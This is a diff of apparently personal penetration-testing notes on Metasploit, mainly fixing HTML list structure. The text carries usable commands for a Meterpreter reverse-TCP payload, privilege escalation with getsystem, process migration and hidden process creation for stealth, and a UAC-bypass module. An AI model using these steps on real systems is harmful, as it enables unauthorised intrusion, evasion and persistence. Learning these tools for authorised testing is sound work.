@@ -46,10 +46,13 @@
 <li><code>sessions</code> can switch between shells<ul>
 <li>Use CTRL+Z to exit a shell but keep it in the background</li>
 <li><code>sessions -l</code> to list available sessions</li>
-<li><code>sessions -i {session_number}</code> to switch (interact) with a session<h3 id="using-payloads">Using Payloads</h3>
-<strong>Staged/Non-Stated Payloads</strong></li>
+<li><code>sessions -i {session_number}</code> to switch (interact) with a session</li>
 </ul>
 </li>
+</ul>
+<h3 id="using-payloads">Using Payloads</h3>
+<p><strong>Staged/Non-Stated Payloads</strong></p>
+<ul>
 <li>Non-staged: payload is sent along with the exploit<ul>
 <li>No use of <code>/</code>  means that it&#39;s non-staged (e.g. <code>shell_reverse_tcp</code>)</li>
 </ul>
@@ -100,20 +103,25 @@
 <li><code>set payload linux/x86/meterpreter/reverse_tcp</code></li>
 <li><code>set LHOST 10.0.0.1</code></li>
 <li><code>set LPORT 4444</code></li>
-<li><code>exploit -j</code><h3 id="post-exploitation">Post-Exploitation</h3>
-<strong>Meterpreter Post-Exploitation Features</strong></li>
+<li><code>exploit -j</code></li>
 </ul>
 </li>
+</ul>
+<h3 id="post-exploitation">Post-Exploitation</h3>
+<p><strong>Meterpreter Post-Exploitation Features</strong></p>
+<ul>
 <li><code>idletime</code> to see how long it&#39;s been since the system was used (e.g. don&#39;t run shit until empty)</li>
 <li><code>getsystem</code> to attempt to elevate privileges to NT AUTHORITY\SYSTEM</li>
 <li><code>migrate {process_id}</code> - injects meterpreter into another process for stealth and persistence<ul>
 <li>If no good processes exist, create one with <code>execute -H -f {process (notepad)}</code><ul>
-<li><code>-H</code> hides the process, so no visual representation will be present
-<strong>Post-Exploitation Modules</strong></li>
+<li><code>-H</code> hides the process, so no visual representation will be present</li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<p><strong>Post-Exploitation Modules</strong></p>
+<ul>
 <li>After injecting ourselves into another process, our privilege level drops, so we need to escalate</li>
 <li><code>exploit/windows/local/bypassuac_sdclt</code> is good for UAC bypassing on Windows<ul>
 <li>We can set our session to the session running the shell (from Ctrl+Z -&gt; <code>bg</code>)</li>
